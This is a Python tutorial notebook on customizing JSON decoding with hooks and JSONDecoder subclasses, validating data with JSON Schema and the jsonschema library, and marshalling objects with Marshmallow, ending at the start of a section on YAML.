We still have the issue of custom objects and classes - how do we handle those?

Well, in pretty much the same way as before - the content of the JSON has to indicate that the object is of a certain "type", and we can then decode it ourselves.

Let's see a simple example:


```
class Person:
    def __init__(self, name, ssn):
        self.name = name
        self.ssn = ssn
        
    def __repr__(self):
        return f'Person(name={self.name}, ssn={self.ssn})'
```


```
j = '''
    {
        "accountHolder": {
            "objecttype": "person",
            "name": "Eric Idle",
            "ssn": 100
        },
        "created": {
            "objecttype": "datetime",
            "value": "2018-10-21T03:00:00"
        }
    }
'''
```


```
def custom_decoder(arg):
    ret_value = arg
    if 'objecttype' in arg:
        if arg['objecttype'] == 'datetime':
            ret_value = datetime.strptime(arg['value'], '%Y-%m-%dT%H:%M:%S')
        elif arg['objecttype'] == 'fraction':
            ret_value = Fraction(arg['numerator'], arg['denominator'])
        elif arg['objecttype'] == 'person':
            ret_value = Person(arg['name'], arg['ssn'])
    return ret_value
```


```
d = json.loads(j, object_hook=custom_decoder)
```


```
d
```




    {'accountHolder': Person(name=Eric Idle, ssn=100),
     'created': datetime.datetime(2018, 10, 21, 3, 0)}



We could also provide our custom JSON encoder in the person class to serialize that class in the way we expect when deserializing, as we saw in an earlier video:


```
class Person:
    def __init__(self, name, ssn):
        self.name = name
        self.ssn = ssn
        
    def __repr__(self):
        return f'Person(name={self.name}, ssn={self.ssn})'
    
    def toJSON(self):
        return dict(objecttype='person', name=self.name, ssn=self.ssn)
```

We can then encode using the techniques we have seen before, and decode using the technique we learned in this video.

There are also a few customized hooks for integers, floats and certain special strings (`-Infinity`, `Infinity` and `NaN`).

For example, we may want to encode floats using a Decimal instead of the standard float.

We could do this by using the `parse_float` argument as follows:


```
from decimal import Decimal
def make_decimal(arg):
    print('Received:', type(arg), arg)
    return Decimal(arg)
```


```
j = '''
    {
        "a": 100,
        "b": 0.2,
        "c": 0.5
    }
'''
```


```
d = json.loads(j, parse_float=make_decimal)
```

    Received: <class 'str'> 0.2
    Received: <class 'str'> 0.5
    


```
d
```




    {'a': 100, 'b': Decimal('0.2'), 'c': Decimal('0.5')}



As you can see we have decimals in our dictionary, instead of floats. Note also that the argument we receive is a string - it would make little sense for us to receive a float since our function is the one that wants to specifically handle converting a JSON string to some particular type.

We can also intercept handling of integers and those constant values I mentioned.


```
j = '''
    {
        "a": 100,
        "b": Infinity
    }
'''
```


```
json.loads(j)
```




    {'a': 100, 'b': inf}




```
def make_int_binary(arg):
    print('Received:', type(arg), arg)
    return bin(int(arg))
```


```
def make_const_none(arg):
    print('Received:', type(arg), arg)
    return None
```


```
json.loads(j, 
           parse_int=make_int_binary, 
           parse_constant=make_const_none)
```

    Received: <class 'str'> 100
    Received: <class 'str'> Infinity
    




    {'a': '0b1100100', 'b': None}



Again note that in all cases, the received argument is the **string** read from the json string.

Finally we have the `object_pairs_hook` argument. It works similarly to the `object_hook` with two differences:
1. the argument is a `list` of 2-tuples - the first value is the key, the second is the value
2. the list is ordered in the same order as the keys in the json document.

Remember that the dictionary is not **guaranteed** to be ordered in the same order as the keys in the json document - given Python 3.6+ has guaranteed dictionary order, this is likely to be true, but the documents do not mention this specifically, so at this point it should be considered an implementation detail and not relied on - if you **must** have gauranteed key order, then you will have to use the `object_pairs_hook`.

Also, you should not specify both `object_hook` and `object_pairs_hook` - if you do, then the `object_pairs_hook` will be used and `object_hook` will be ignored.


```
j = '''
    {
        "a": [1, 2, 3, 4, 5],
        "b": 100,
        "c": 10.5,
        "d": NaN,
        "e": null,
        "f": "python"
    }
'''
```


```
def float_handler(arg):
    print('float handler', type(arg), arg)
    return float(arg)
```


```
def int_handler(arg):
    print('int handler', type(arg), arg)
    return int(arg)
```


```
def const_handler(arg):
    print('const handler', type(arg), arg)
    return None
```


```
def obj_hook(arg):
    print('obj hook', type(arg), arg)
    return arg
```


```
def obj_pairs_hook(arg):
    print('obj pairs hook', type(arg), arg)
    return arg
```


```
json.loads(j)
```




    {'a': [1, 2, 3, 4, 5], 'b': 100, 'c': 10.5, 'd': nan, 'e': None, 'f': 'python'}




```
json.loads(j, 
           object_hook=obj_hook,
           parse_float=float_handler,
           parse_int=int_handler,
           parse_constant=const_handler
          )
```

    int handler <class 'str'> 1
    int handler <class 'str'> 2
    int handler <class 'str'> 3
    int handler <class 'str'> 4
    int handler <class 'str'> 5
    int handler <class 'str'> 100
    float handler <class 'str'> 10.5
    const handler <class 'str'> NaN
    obj hook <class 'dict'> {'a': [1, 2, 3, 4, 5], 'b': 100, 'c': 10.5, 'd': None, 'e': None, 'f': 'python'}
    




    {'a': [1, 2, 3, 4, 5],
     'b': 100,
     'c': 10.5,
     'd': None,
     'e': None,
     'f': 'python'}




```
json.loads(j, 
           object_pairs_hook=obj_pairs_hook,
           parse_float=float_handler,
           parse_int=int_handler,
           parse_constant=const_handler
          )
```

    int handler <class 'str'> 1
    int handler <class 'str'> 2
    int handler <class 'str'> 3
    int handler <class 'str'> 4
    int handler <class 'str'> 5
    int handler <class 'str'> 100
    float handler <class 'str'> 10.5
    const handler <class 'str'> NaN
    obj pairs hook <class 'list'> [('a', [1, 2, 3, 4, 5]), ('b', 100), ('c', 10.5), ('d', None), ('e', None), ('f', 'python')]
    




    [('a', [1, 2, 3, 4, 5]),
     ('b', 100),
     ('c', 10.5),
     ('d', None),
     ('e', None),
     ('f', 'python')]



And if we specify both object hooks, then `object_hook` is basically ignored:


```
json.loads(j, 
           object_hook=obj_hook,
           object_pairs_hook=obj_pairs_hook,
           parse_float=float_handler,
           parse_int=int_handler,
           parse_constant=const_handler
          )
```

    int handler <class 'str'> 1
    int handler <class 'str'> 2
    int handler <class 'str'> 3
    int handler <class 'str'> 4
    int handler <class 'str'> 5
    int handler <class 'str'> 100
    float handler <class 'str'> 10.5
    const handler <class 'str'> NaN
    obj pairs hook <class 'list'> [('a', [1, 2, 3, 4, 5]), ('b', 100), ('c', 10.5), ('d', None), ('e', None), ('f', 'python')]
    




    [('a', [1, 2, 3, 4, 5]),
     ('b', 100),
     ('c', 10.5),
     ('d', None),
     ('e', None),
     ('f', 'python')]



As we saw in the decoding videos, we can also subclass the `JSONDecoder` class (just like we subclassed the `JSONEncoder` - we'll look at this next.

##  Using JSONDecoder

Just like we can use a subclass of `JSONEncoder` to customize our json encodings, we can use a subclass of the default `JSONDecoder` class to customize decoding our json strings.

It works quite differently from the `JSONEncoder` subclassing though.

When we subclass `JSONEncoder` we override the `default` method which then allows us to intercept encoding of specific types of objects, and delegate back to the parent class what we don't want to handle specifically.

With the `JSONDecoder` class we override the `decode` function which passes us the **entire** JSON as a **string** and we have to return whatever Python object we want. There's no delegating anything back to the parent class unless we want to completely skip customizing the output.

Let's first see how the functions work:


```
import json
```


```
j = '''
    {
        "a": 100,
        "b": [1, 2, 3],
        "c": "python",
        "d": {
            "e": 4,
            "f": 5.5
        }
    }
'''
```


```
class CustomDecoder(json.JSONDecoder):
    def decode(self, arg):
        print("decode:", type(arg), arg)
        return "a simple string object"
```


```
json.loads(j, cls=CustomDecoder)
```

As you can see, whatever we return from the `decode` method is the **result** of calling `loads`.

So, we might want to intercept certain JSON strings, handling them in some custom way, and delegate back to the parent class if it's not a string we want to handle ourselves - but it's all or nothing:

Let's see an example of how we might want to use this:


```
class Point:
    def __init__(self, x, y):
        self.x = x
        self.y = y
        
    def __repr__(self):
        return f'Point(x={self.x}, y={self.y})'
```


```
j_points = '''
{
    "points": [
        [10, 20],
        [-1, -2],
        [0.5, 0.5]
    ]
}
'''

j_other = '''
{
    "a": 1,
    "b": 2
}
'''
```


```
class CustomDecoder(json.JSONDecoder):
    def decode(self, arg):
        if 'points' in arg:
            obj = json.loads(arg)
            return "parsing object for points"
        else:
            return super().decode(arg)
```


```
json.loads(j_points, cls=CustomDecoder)
```


```
json.loads(j_other, cls=CustomDecoder)
```




    {'a': 1, 'b': 2}



So, let's implement the custom decoder now, assuming that `points` will be a top level node in the JSON object:


```
class CustomDecoder(json.JSONDecoder):
    def decode(self, arg):
        obj = json.loads(arg)
        if 'points' in obj:  # top level
            obj['points'] = [Point(x, y) 
                             for x, y in obj['points']]
        return obj
```


```
json.loads(j_points, cls=CustomDecoder)
```




    {'points': [Point(x=10, y=20), Point(x=-1, y=-2), Point(x=0.5, y=0.5)]}




```
json.loads(j_other, cls=CustomDecoder)
```




    {'a': 1, 'b': 2}



Of course, we can be more fancy and maybe handle points by specifying the data type in the JSON object (and again, this is just how **we**, the developer, decide to make that specification).

Here I am going to specify that a `Point` object in the JSON document should be specified using this format:

```
{"_type": "point", "x": x-coord, "y": y-coord}
```

So, when we parse the JSON string we are going to look for such a structure, and do the appropriate type conversion if needed. Of course, we'll have to look recursively in the JSON for this structure. We'll follow the same approach as before, first deserializing to a "generic" Python dict, then replacing any `Point` structure as we find them.

To avoid having to iterate through the deserialized JSON object when we don't have that structure there in the first place, I'm going to look for `"_type": "point"` in the **string**. Technically we also need to look for `"_type":"point"` since both, from a JSON object perspective, are the same thing.
In fact any amount of whitespace surrounding the `:` is acceptable. It would be possible but result in very unwieldy and concoluted code if we were to use an ordinary string search, so I'm going to use a regular expression instead (if you need help getting started with regular expressions, I highly recommend using this site:

https://regexr.com/


```
import re
pattern = r'"_type"\s*:\s*"point"'
```

In this pattern, `\s` simply means a whitespace character, and the `*` right after it means zero or more times.

Also note that we prefix that string with `r` to tell Python not to interpret the `\` as anything special - otherwise Python will try to escape that, or interpet it, when conbined with another character, as an escape sequence.

Let's see a quick example of this first:


```
print('word1\tword2')
```

    word1	word2
    


```
print(r'word1\tword2')
```

    word1\tword2
    

Notice the difference? Since we use the `\` character a lot in regular expressions, we should always use this `r` prefix which indicates a **raw** string, and Python will not try to recognize escape sequences in our pattern.

So, now let's continue testing out our regular expression pattern. We'll compile it so we can re-use it, but you dont have to.

Once we have it compiled, we can use the `search` method that will find the first occurrence of the pattern in our search string, or return `None` if it was not found:


```
regexp = re.compile(pattern)
```


```
print(regexp.search('"a": 1'))
```

    None
    


```
print(regexp.search('"_type": "point"'))
```

    <_sre.SRE_Match object; span=(0, 16), match='"_type": "point"'>
    


```
print(regexp.search('"_type"   : "point"'))
```

    <_sre.SRE_Match object; span=(0, 19), match='"_type"   : "point"'>
    

Alternatively, if we don't want to compile it (if we only use it once, there's no real need to do so), we can do a search this way:


```
re.search(pattern, '"_type"  :  "point"')
```




    <_sre.SRE_Match object; span=(0, 19), match='"_type"  :  "point"'>



OK, now that we have a working regular expression pattern we can implement our custom JSON decoder.


```
class CustomDecoder(json.JSONDecoder):
    def decode(self, arg):
        obj = json.loads(arg)
        pattern = r'"_type"\s*:\s*"point"'
        if re.search(pattern, arg):
            # we have at least one `Point'
            obj = self.make_pts(obj)
        return obj
    
    def make_pts(self, obj):
        # recursive function to find and replace points
        # received object could be a dictionary, a list, or a simple type
        if isinstance(obj, dict):
            # first see if this dictionary is a point itself
            if '_type' in obj and obj['_type'] == 'point':
                # could have used: if obj.get('_type', None) == 'point'
                obj = Point(obj['x'], obj['y'])
            else:
                # root object is not a point
                # but it could contain a sub-object which itself 
                # is or contains a Point object
                for key, value in obj.items():
                    obj[key] = self.make_pts(value)
        elif isinstance(obj, list):
            for index, item in enumerate(obj):
                obj[index] = self.make_pts(item)
        return obj
```


```
j = '''
{
    "a": 100,
    "b": 0.5,
    "rectangle": {
        "corners": {
            "b_left": {"_type": "point", "x": -1, "y": -1},
            "b_right": {"_type": "point", "x": 1, "y": -1},
            "t_left": {"_type": "point", "x": -1, "y": 1},
            "t_right": {"_type": "point", "x": 1, "y": 1}
        },
        "rotate": {"_type" : "point", "x": 0, "y": 0},
        "interior_pts": [
            {"_type": "point", "x": 0, "y": 0},
            {"_type": "point", "x": 0.5, "y": 0.5}
        ]
    }
}
'''
```


```
json.loads(j)
```




    {'a': 100,
     'b': 0.5,
     'rectangle': {'corners': {'b_left': {'_type': 'point', 'x': -1, 'y': -1},
       'b_right': {'_type': 'point', 'x': 1, 'y': -1},
       't_left': {'_type': 'point', 'x': -1, 'y': 1},
       't_right': {'_type': 'point', 'x': 1, 'y': 1}},
      'rotate': {'_type': 'point', 'x': 0, 'y': 0},
      'interior_pts': [{'_type': 'point', 'x': 0, 'y': 0},
       {'_type': 'point', 'x': 0.5, 'y': 0.5}]}}




```
from pprint import pprint
pprint(json.loads(j, cls=CustomDecoder))
```

    {'a': 100,
     'b': 0.5,
     'rectangle': {'corners': {'b_left': Point(x=-1, y=-1),
                               'b_right': Point(x=1, y=-1),
                               't_left': Point(x=-1, y=1),
                               't_right': Point(x=1, y=1)},
                   'interior_pts': [Point(x=0, y=0), Point(x=0.5, y=0.5)],
                   'rotate': Point(x=0, y=0)}}
    

The `JSONDecoder` class also has arguments such as `parse_int`, `parse_float`, etc we saw in the previous lecture.
We can use those to define a custom `JSONEncoder` class if we wanted to - let's say we want to use `Decimals` instead of floats - just like before, but instead of specifying this each and every time we calls `loads`, we can bundle this up into a custom decoder instead:


```
from decimal import Decimal
CustomDecoder = json.JSONDecoder(parse_float=Decimal)
```


```
d = CustomDecoder.decode(j)
```


```
pprint(d)
```

    {'a': 100,
     'b': Decimal('0.5'),
     'rectangle': {'corners': {'b_left': {'_type': 'point', 'x': -1, 'y': -1},
                               'b_right': {'_type': 'point', 'x': 1, 'y': -1},
                               't_left': {'_type': 'point', 'x': -1, 'y': 1},
                               't_right': {'_type': 'point', 'x': 1, 'y': 1}},
                   'interior_pts': [{'_type': 'point', 'x': 0, 'y': 0},
                                    {'_type': 'point',
                                     'x': Decimal('0.5'),
                                     'y': Decimal('0.5')}],
                   'rotate': {'_type': 'point', 'x': 0, 'y': 0}}}
    

Of course, we can combine this with our custom decoder too:


```
class CustomDecoder(json.JSONDecoder):
    base_decoder = json.JSONDecoder(parse_float=Decimal)
    
    def decode(self, arg):
        obj = self.base_decoder.decode(arg)
        pattern = r'"_type"\s*:\s*"point"'
        if re.search(pattern, arg):
            # we have at least one `Point'
            obj = self.make_pts(obj)
        return obj
    
    def make_pts(self, obj):
        # recursive function to find and replace points
        # received object could be a dictionary, a list, or a simple type
        if isinstance(obj, dict):
            # first see if this dictionary is a point itself
            if '_type' in obj and obj['_type'] == 'point':
                obj = Point(obj['x'], obj['y'])
            else:
                # root object is not a point
                # but it could contain a sub-object which itself 
                # is or contains a Point object nested at some level
                # maybe another dictionary, or a list
                for key, value in obj.items():
                    obj[key] = self.make_pts(value)
        elif isinstance(obj, list):
            # received a list - need to run each item through make_pts
            for index, item in enumerate(obj):
                obj[index] = self.make_pts(item)
        return obj
```


```
json.loads(j, cls=CustomDecoder)
```




    {'a': 100,
     'b': Decimal('0.5'),
     'rectangle': {'corners': {'b_left': Point(x=-1, y=-1),
       'b_right': Point(x=1, y=-1),
       't_left': Point(x=-1, y=1),
       't_right': Point(x=1, y=1)},
      'rotate': Point(x=0, y=0),
      'interior_pts': [Point(x=0, y=0), Point(x=0.5, y=0.5)]}}



It's not evident that our `Point(x=0.5, y=0.5)` actually contains `Decimal` objects - that's really just the string representation - so let's just make sure they are indeed `Decimal` objects:


```
result = json.loads(j, cls=CustomDecoder)
pt = result['rectangle']['interior_pts'][1]
print(type(pt.x), type(pt.y))
```

    <class 'decimal.Decimal'> <class 'decimal.Decimal'>
    

As you can see, decoding JSON into custom objects is not exactly easy - the basic reason being that JSON does not support anything other than simple data types such as integers, floats, strings, booleans, constants and objects and lists.

The rest is up to us.

This is one of the reasons there are quite a few 3rd party libraries that allow us to serialize and deserialize JSON objects that follow a certain schema.

I'll discuss some of those in upcoming lectures.

##  JSON Schemas

Often when we work with JSON data, the way the data is formatted is not haphazard - it often conforms to some very precise specification.

For example, REST API's will conform to some specific format for JSON input and output. 

This is called conforming to a **schema**. It is very similar to how relational databases work - we have a schema that precisely defines the columns in tables, the relationships between tables and so on.

One of the main reasons for having these schemas for JSON data is that it allows us to serialize and deserialize the data more easily - we know in advance what the JSON structure will look like, and we can therefore write code that will leverage our understanding of the JSON structure.

There are many ways in which we can define a JSON schema - it could be as simple as creating a Word document that explains how the JSON needs to be structured. Although that works, there are better, standards-based approaches though.

One of these is the JSON Schema standard:
https://json-schema.org/

We don't need Python, or any programming language, to define a schema - the schema definition is completely language-independent.

But given a JSON schema, we can now use a consistent approach to serializing and deserializing the data.

Moreover, we can also write code to serialize and deserialize specific object types - since we know exactly what to expect in the JSON string.

I am not going to cover JSON Schema in any detail here, but I will show you some simple examples of how these schemas can be defined.

Let's say we are creating an API that responds to a POST method to create some resource - let's say a Person. We want our JSON structure to look like the following:

```
{
    "firstName": "...",
    "middleInitial": "...",
    "lastName": "...",
    "age": ...
}
```

We can start with a simple schema as follows:


```
person_schema = {
    "type": "object",
    "properties": {
        "firstName": {"type": "string"},
        "middleInitial": {"type": "string"},
        "lastName": {"type": "string"},
        "age": {"type": "number"}
    }
}
```

The question now becomes, given a JSON string, does it conform to the schema or not?

For example, this one is OK:


```
p1 = '''
    {
        "firstName": "John",
        "middleInitial": "M",
        "lastName": "Cleese",
        "age": 79
    }
'''
```

How about this one is does not:


```
p2 = '''
    {
        "firstName": "John",
        "middleInitial": 100,
        "lastName": "Cleese",
        "age": "Unknown"
    }
'''
```

`p2` does not conform to our schema for two reasons:
1. "middleInitial" should be a string
2. "age" should be a number

How about this one?


```
p3 = '''
    {
        "firstName": "John",
        "age": -10.5
    }
'''
```

Actually this one **does** conform to our schema - unless we indicate a field as required, it is optional.

The `"age"` field is a number, so it also conforms to our schema. But we really would want it to be an integer, and not allow negative numbers.

Fortunately, JSON Schema does allow us to be more specific with our schema:


```
person_schema = {
    "type": "object",
    "properties": {
        "firstName": {
            "type": "string",
            "minLength": 1
        },
        "middleInitial": {
            "type": "string",
            "minLength": 1,
            "maxLength": 1
        },
        "lastName": {
            "type": "string",
            "minLength": 1
        },
        "age": {
            "type": "integer", 
            "minimum": 0
        }
    },
    "required": ["firstName", "lastName"]
}
```

So in this schema we require that `"firstName"` and `"lastName"` be provided, and have a minimum number of characters (`1`). We do not make `"middleInitial"` required, but if it is provided it must be one, and exactly one, character long.

The `"age"` field is not required, but if it is, it must be a non-negative integer.

The JSON Schema specification is actually quite intricate and can be used to specify schemas with great accuracy and specificity.

For example, we may have a field `"eyeColor"` which must contain (if provided) one of a few specific values: `amber`, `blue`, `brown`, `gray`, `green`, `hazel`, `red`, or `violet`.

We can do this as follows:


```
person_schema = {
    "type": "object",
    "properties": {
        "firstName": {
            "type": "string",
            "minLength": 1
        },
        "middleInitial": {
            "type": "string",
            "minLength": 1,
            "maxLength": 1
        },
        "lastName": {
            "type": "string",
            "minLength": 1
        },
        "age": {
            "type": "integer", 
            "minimum": 0
        },
        "eyeColor": {
            "type": "string",
            "enum": ["amber", "blue", "brown", "gray", 
                     "green", "hazel", "red", "violet"]
        }
    },
    "required": ["firstName", "lastName"]
}
```

We can now go back to our original question - determining if a given JSON string conforms to a given schema. We can easily determine if the JSON is valid (we can just do a `loads` for example), but does it conform to the JSON Schema?

We could write Python code to do this ourselves, but that would be really complicated!!

Instead, I am going to use the excellent Python library linked here: https://github.com/Julian/jsonschema

You will need to install it first (usually `pip install jsonschema` in whatever environment you are using - you are using a virtual environment of some sort, right?!!)


```
from jsonschema import validate
from jsonschema.exceptions import ValidationError
from json import loads, dumps, JSONDecodeError
```

We can use the `validate` function, but it will not work with a string - it needs to be deserialized into a Python dictionary first (which means it will have to be a valid JSON structure first).


```
print(p1)

try:
    validate(loads(p1), person_schema)
except JSONDecodeError as ex:
    print(f'Invalid JSON: {ex}')
except ValidationError as ex:
    print(f'Validation error: {ex}')
else:
    print('JSON is valid')
```

    
        {
            "firstName": "John",
            "middleInitial": "M",
            "lastName": "Cleese",
            "age": 79
        }
    
    JSON is valid
    


```
print(p2)

try:
    validate(loads(p2), person_schema)
except JSONDecodeError as ex:
    print(f'Invalid JSON: {ex}')
except ValidationError as ex:
    print(f'Validation error: {ex}')
else:
    print('JSON is valid')
```

    
        {
            "firstName": "John",
            "middleInitial": 100,
            "lastName": "Cleese",
            "age": "Unknown"
        }
    
    Validation error: 100 is not of type 'string'
    
    Failed validating 'type' in schema['properties']['middleInitial']:
        {'maxLength': 1, 'minLength': 1, 'type': 'string'}
    
    On instance['middleInitial']:
        100
    


```
print(p3)
try:
    validate(loads(p3), person_schema)
except JSONDecodeError as ex:
    print(f'Invalid JSON: {ex}')
except ValidationError as ex:
    print(f'Validation error: {ex}')
else:
    print('JSON is valid')
```

    
        {
            "firstName": "John",
            "age": -10.5
        }
    
    Validation error: -10.5 is not of type 'integer'
    
    Failed validating 'type' in schema['properties']['age']:
        {'minimum': 0, 'type': 'integer'}
    
    On instance['age']:
        -10.5
    

You'll notice that the validator only returns the first validation error it encounters. This can be changed to run the entire validation and return all the validation errors (if any), but utilizes a slightly different way of performing validation:


```
from jsonschema import Draft4Validator

validator = Draft4Validator(person_schema)
```


```
for error in validator.iter_errors(loads(p2)):
    print(error, end='\n-----------\n')
```

    100 is not of type 'string'
    
    Failed validating 'type' in schema['properties']['middleInitial']:
        {'maxLength': 1, 'minLength': 1, 'type': 'string'}
    
    On instance['middleInitial']:
        100
    -----------
    'Unknown' is not of type 'integer'
    
    Failed validating 'type' in schema['properties']['age']:
        {'minimum': 0, 'type': 'integer'}
    
    On instance['age']:
        'Unknown'
    -----------
    

We can also test out the schema for `eyeColor`:


```
p4 = '''
    {
        "firstName": "John",
        "middleInitial": null,
        "lastName": "Cleese",
        "eyeColor": "blue-gray"
    }
'''
```


```
for error in validator.iter_errors(loads(p4)):
    print(error, end='\n-----------\n')    
```

    None is not of type 'string'
    
    Failed validating 'type' in schema['properties']['middleInitial']:
        {'maxLength': 1, 'minLength': 1, 'type': 'string'}
    
    On instance['middleInitial']:
        None
    -----------
    'blue-gray' is not one of ['amber', 'blue', 'brown', 'gray', 'green', 'hazel', 'red', 'violet']
    
    Failed validating 'enum' in schema['properties']['eyeColor']:
        {'enum': ['amber',
                  'blue',
                  'brown',
                  'gray',
                  'green',
                  'hazel',
                  'red',
                  'violet'],
         'type': 'string'}
    
    On instance['eyeColor']:
        'blue-gray'
    -----------
    

So JSON Schema paired with this library is a great way to ensure a JSON document conforms to some specific schema. It is useful even when you create your own JSON serializer to make sure you are conforming to your own pre-determined schema - especially useful in unit testing to make sure you did not miss something when serializing your objects to JSON.

But all this does not address the other issue we have - serializing and deserializing Python objects to and from JSON strings (marshalling).

Not to worry, there are also quite a few libraries out there that will help with this difficult task too.

In the next video I will look at one of the more popular ones - Mashmallow - but there are others as well.

##  Marshmallow

Marshmallow gets its name from "marshalling" - in other words it is a library that can be used to "translate" objects to and from complex data types (such as custom objects) and simple datatypes (such as dictionaries or lists of strings, integers, etc), sometimes called  native data types, which can then easily be serialized and deserialized into a JSON format.
At the same time, it can also perform validation.

Marshmallow is very customizable, and I am not going to go into a whole lot of detail here, other than show you a few examples.

If you want more info about this great Python library, you can read up about it here: https://marshmallow.readthedocs.io/en/3.0/


As might be expected, we still declare some sort of schema for our data - there's no magic here!

Let's first see how we might create a simple schema for our `Person` object.

We start by creating the class itself that we will use in our app:


```
class Person:
    def __init__(self, first_name, last_name, dob):
        self.first_name = first_name
        self.last_name = last_name
        self.dob = dob
        
    def __repr__(self):
        return f'Person({self.first_name}, {self.last_name}, {self.dob})'
```


```
from datetime import date

p1 = Person('John', 'Cleese', date(1939, 10, 27))
```


```
p1
```




    Person(John, Cleese, 1939-10-27)



So we want to serialize and deserialize this `Person` object into a simple dictionary containing strings, including an ISO formatted string for the date of birth.


```
from marshmallow import Schema, fields
```


```
class PersonSchema(Schema):
    first_name = fields.Str()
    last_name = fields.Str()
    dob = fields.Date()
```

We can now create a schema instance that will handle any object type that has the `first_name`, `last_name` and `dob` fields. You'll notice that we used Marshmallow specific data types for strings and dates. Marshmallow has many other data types too to handle Booleans, numbers (integers, reals, even decimals), datetime, email, url, etc.

We first have to create an instance of the `PersonSchema` class:


```
person_schema = PersonSchema()
```

We can serialize our custom object into a "simple" dictionary:


```
person_schema.dump(p1)
```




    MarshalResult(data={'first_name': 'John', 'dob': '1939-10-27', 'last_name': 'Cleese'}, errors={})



As you can see we have two properties here: `data` and `errors`. The `data` property will contain our serialized data, and the `errors` property will tell us if any errors were encountered while serializing our objects.


```
type(person_schema.dump(p1).data)
```




    dict



We can also serialize our objects directly to JSON using `dumps`:


```
person_schema.dumps(p1).data
```




    '{"first_name": "John", "dob": "1939-10-27", "last_name": "Cleese"}'



We can use other objects, not necessarily of `Person` type, and if those fields are present they will be used in the serialization:


```
from collections import namedtuple

PT=namedtuple('PT', 'first_name, last_name, dob')
```


```
p2 = PT('Eric', 'Idle', date(1943, 3, 29))
```


```
person_schema.dumps(p2).data
```




    '{"first_name": "Eric", "dob": "1943-03-29", "last_name": "Idle"}'



But if we use an object that does not have the required fields:


```
PT2 = namedtuple('PT2', 'first_name, last_name, age')
p3 = PT2('Michael', 'Palin', 75)
```


```
person_schema.dumps(p3).data
```




    '{"first_name": "Michael", "last_name": "Palin"}'



As you can see Marshmallow here only uses what it can.

What's interesting is that we can also specify what fields should occur in the deserialized output, using `only` to specify inclusions, or `exclude` to specify exclusions:


```
person_partial = PersonSchema(only=('first_name', 'last_name'))
```


```
person_partial.dumps(p1).data
```




    '{"first_name": "John", "last_name": "Cleese"}'



Equivalently:


```
person_partial = PersonSchema(exclude=['dob'])
```


```
person_partial.dumps(p1).data
```




    '{"first_name": "John", "last_name": "Cleese"}'



What happens if we have the wrong data type for those fields?


```
p4 = Person(100, None, 200)
```


```
person_schema.dumps(p4)
```




    MarshalResult(data='{"first_name": "100", "last_name": null}', errors={'dob': ['"200" cannot be formatted as a date.']})



As you can see, the `errors` property tells us that the data value could not be interpreted as a date.

On the other hand the values `100` and `None` for the string values were fine - the integer was converted into a string, and the `None` value for `last_name` was retained.

Our schemas can also get more complicated, including sub-schemas based on other schemas.

For example, we can define a `Movie` schema that includes a movie title, year of release, and a list of actors:


```
class Movie:
    def __init__(self, title, year, actors):
        self.title = title
        self.year = year
        self.actors = actors
```


```
class MovieSchema(Schema):
    title = fields.Str()
    year = fields.Integer()
    actors = fields.Nested(PersonSchema, many=True)
```


```
p1, p2
```




    (Person(John, Cleese, 1939-10-27),
     PT(first_name='Eric', last_name='Idle', dob=datetime.date(1943, 3, 29)))




```
parrot = Movie('Parrot Sketch', 1989, [p1, 
                                       Person('Michael', 
                                              'Palin', 
                                              date(1943, 5, 5))
                                      ])
```


```
MovieSchema().dumps(parrot)
```




    MarshalResult(data='{"title": "Parrot Sketch", "year": 1989, "actors": [{"first_name": "John", "dob": "1939-10-27", "last_name": "Cleese"}, {"first_name": "Michael", "dob": "1943-05-05", "last_name": "Palin"}]}', errors={})



There's a lot more we can do to control serialization - take a look at the documentation if you want to learn more.

Now, let's look at deserialization a little bit.

To deserialize a simple dictionary we use the `load` method (deserializes a dictionary, the opposite of what `dump` does basically). We deserialize a JSON string using the `loads` method.

Let's recall our Person schema:


```
class PersonSchema(Schema):
    first_name = fields.Str()
    last_name = fields.Str()
    dob = fields.Date()
```

And let's deserialize a dictionary:


```
person_schema = PersonSchema()
```


```
person_schema.load(dict(first_name='John',
                        last_name='Cleese',
                        dob='1939-10-27'))
```




    UnmarshalResult(data={'first_name': 'John', 'dob': datetime.date(1939, 10, 27), 'last_name': 'Cleese'}, errors={})



So you can see we get this `UnmarshalResult` object back, with a `data` property - notice how the data was converted from a string into an actual date object.

But we still did not get a `Person` object back in `data`. Instead we got a plain dictionary back - ultimately we may want a `Person` object.

To do this, we need to tell Marshmallow what object to use when it deserializes our data:


```
from marshmallow import post_load

class PersonSchema(Schema):
    first_name = fields.Str()
    last_name = fields.Str()
    dob = fields.Date()
    
    @post_load
    def make_person(self, data):
        return Person(**data)
```


```
person_schema = PersonSchema()
```


```
person_schema.load(dict(first_name='John',
                        last_name='Cleese',
                        dob='1939-10-27'))
```




    UnmarshalResult(data=Person(John, Cleese, 1939-10-27), errors={})



And now you can see that `data` contains a `Person` object.

So now let's go ahead and fix up our `MovieSchema` as well:


```
class MovieSchema(Schema):
    title = fields.Str()
    year = fields.Integer()
    actors = fields.Nested(PersonSchema, many=True)
    
    @post_load
    def make_movie(self, data):
        return Movie(**data)
```


```
movie_schema = MovieSchema()
```

Here we're going to load from a JSON string to see that it works equally well:


```
json_data = '''
{"actors": [
    {"first_name": "John", "last_name": "Cleese", "dob": "1939-10-27"}, 
    {"first_name": "Michael", "last_name": "Palin", "dob": "1943-05-05"}], 
"title": "Parrot Sketch", 
"year": 1989}
'''
```


```
movie = movie_schema.loads(json_data).data
```


```
type(movie)
```




    __main__.Movie




```
movie.title, movie.year
```




    ('Parrot Sketch', 1989)




```
movie.actors
```




    [Person(John, Cleese, 1939-10-27), Person(Michael, Palin, 1943-05-05)]



There is a **lot** more that this library can do - we did not even touch on validation here (required fields for example), nor how you can manipulate serialization and deserialization in many different ways, including handling of missing values, and much much more. If you are going to work with complex objects and have to deal with JSON (or other) marshalling, I strongly urge you to consider this library. It has a bit of a learning curve, but is well worth the effort!

There are others out there as well. `Colander`, part of the `Pyramid` project is also popular with people using `Pyramid`. Personally I just find `Marshmallow` more powerful and pleasant to work with.

##  YAML Format

YAML, like JSON, is another data serialization standard. It is actually easier to read than JSON, and although it has been around for a long time (since 2001), it has gained a lot of popularity, especially in the Dev Ops world for configuration files (Docker, Kubernetes, etc).

Like JSON it is able to represent simple data types (strings, numbers, boolean, etc) as well as collections and associative arrays (dictionaries).

YAML focuses on human readability, and is a little more complex to parse.

Here is a sample YAML file:

```
title: Parrot Sketch
year: 1989
actors:
    - first_name: John
      last_name: Cleese
      dob: 1939-10-27
    - first_name: Michael
      last_name: Palin
      dob: 1943-05-05
```

As you can see this is much easier to read than JSON or XML.

To parse YAML into a Python dictionary would take a fair amount of work - especially since YAML is quite flexible.

